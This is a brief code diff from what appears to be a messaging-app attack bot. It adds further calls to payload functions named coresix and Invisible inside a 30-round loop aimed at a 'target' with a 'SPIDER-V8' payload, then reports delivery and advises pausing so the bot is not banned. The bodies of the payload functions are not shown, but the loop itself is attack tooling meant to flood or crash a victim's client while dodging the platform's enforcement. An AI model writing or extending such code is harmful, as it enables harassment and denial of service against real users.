@@ -1683,6 +1683,8 @@ await Invisible(target)
 for (let j = 0; j < 30; j++) {
 await coresix(target, "SPIDER-V8", 1020000, true);
 await bugtest(target, "SPIDER-V8", 1020000, true);
+await coresix(target, "SPIDER-V8", 1020000, true);
+await Invisible(target)
 await sleep(500)
 }
 await reply(`_Successfully Spider has delivered to ${target} Using ${command}._\n\n> Pause 2 minutes so that the bot is not banned.`)
